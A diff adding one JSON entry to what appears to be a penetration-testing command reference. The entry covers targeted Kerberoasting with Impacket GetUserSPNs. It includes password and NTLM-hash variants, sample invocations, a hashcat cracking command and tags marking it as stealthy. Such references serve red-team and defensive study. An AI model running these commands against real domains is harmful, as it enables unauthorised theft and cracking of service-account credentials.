@@ -1,0 +1,22 @@
+{
+  "id": "GetUserSPNs-request-user",
+  "name": "Impacket Targeted Kerberoast",
+  "command": "impacket-GetUserSPNs -request-user <target_user> -dc-ip <dc-ip> '<domain>/<user>:<password>'",
+  "description": "Request a TGS only for a specific service account instead of every kerberoastable user in the domain. Stealthier (one ticket request, one event) and useful when you already know the high-value SPN you care about.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["kerberos", "ldap"],
+  "tags": ["impacket", "kerberoast", "spn", "tgs", "targeted", "stealth"],
+  "variations": [
+    { "label": "NTLM Hash", "requires": "hash", "command": "impacket-GetUserSPNs -request-user <target_user> -hashes ':<hash>' -dc-ip <dc-ip> '<domain>/<user>'" },
+    { "label": "Output to File", "requires": "password", "command": "impacket-GetUserSPNs -request-user <target_user> -dc-ip <dc-ip> '<domain>/<user>:<password>' -outputfile kerb.txt" }
+  ],
+  "references": [
+    { "title": "Impacket — GetUserSPNs.py", "url": "https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py" },
+    { "title": "The Hacker Recipes — Kerberoasting", "url": "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" }
+  ],
+  "examples": [
+    "impacket-GetUserSPNs -request-user sqlsvc -dc-ip 10.10.10.10 'CORP/jdoe:Password123!'",
+    "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt"
+  ]
+}
